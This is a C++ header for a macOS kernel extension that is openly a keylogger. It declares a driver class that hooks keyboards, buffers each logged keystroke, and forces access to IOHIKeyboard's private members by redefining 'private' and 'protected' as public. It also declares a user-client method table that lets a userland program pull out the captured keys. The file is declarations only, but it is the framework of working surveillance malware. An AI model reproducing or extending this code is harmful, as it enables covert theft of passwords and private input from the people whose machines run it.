/* add your code here */

#include <IOKit/IOService.h>

#include <IOKit/IOService.h>
#include <IOKit/IOUserClient.h>
#include <IOKit/ndrvsupport/IOMacOSTypes.h>

#include "KeyLogKeys.h"
#include "KeyLogCommon.h"

/* trickery to fuck up with private variables LOL */
#define private public
#define protected public
#include <IOKit/hidsystem/IOHIKeyboard.h>
#undef private
#undef protected



class com_prebeg_kext_KeyLog : public IOService
{
		OSDeclareDefaultStructors(com_prebeg_kext_KeyLog)

protected:
    static bool notificationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier);
    static bool terminationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier);

	friend class KeyLogUserClient;
	
	unsigned char*		fMemBuf;
	UInt32				buffsize;
	
	IONotifier *notify;
	IONotifier *notifyTerm;
		
public:
	
    virtual bool init(OSDictionary *dictionary = 0);
    virtual void free(void);
    
	virtual IOService *probe(IOService *provider, SInt32 *score);
    
	virtual bool start(IOService *provider);
    virtual void stop(IOService *provider);
    
	void activate();
	void deactivate();
    void clearKeyboards();
    
	
	IOReturn BuffandKeys(UInt32* size,UInt32* keys);
	IOReturn Buffer(bufferStruct* inStruct);

    OSArray *loggedKeyboards;
    UInt32 kextKeys;
    void logStroke( unsigned key, unsigned flags, unsigned charCode );
};



/*
 This is the UserClient class that is used to talk to the driver (kext) from userland.
 */


class KeyLogUserClient : public IOUserClient
{
    
    OSDeclareDefaultStructors(KeyLogUserClient);
	
protected:
	com_prebeg_kext_KeyLog*	fProvider;
	task_t		fTask;
	
public:
	// IOService overrides
	virtual bool start( IOService* provider );
	virtual void stop( IOService* provider );
	
	// IOUserClient overrides
	virtual bool initWithTask( task_t owningTask,
							  void * securityID,
							  UInt32 type,
							  OSDictionary * properties );
	virtual IOReturn clientClose();
	virtual IOExternalMethod* getTargetAndMethodForIndex( IOService** targetP, UInt32 index );
};

// external methods table
static const IOExternalMethod externalMethods[kNumlogKextMethods] =
{
    {
        // ::IOReturn BuffandKeys(UInt32* size,UInt32* keys);
        NULL,
        (IOMethod)&com_prebeg_kext_KeyLog::BuffandKeys,
        kIOUCScalarIScalarO,		// scalar in/out
        0,							// number of scalar inputs
        2							// number of scalar outputs
    },
	{
        // ::IOReturn Buffer(bufferStruct* myStruct)
        NULL,
        (IOMethod)&com_prebeg_kext_KeyLog::Buffer,
        kIOUCScalarIStructO,		// scalar in/struct out
		0,							// number of scalar inputs
		sizeof(bufferStruct)		// size of structure output
    },
	
};
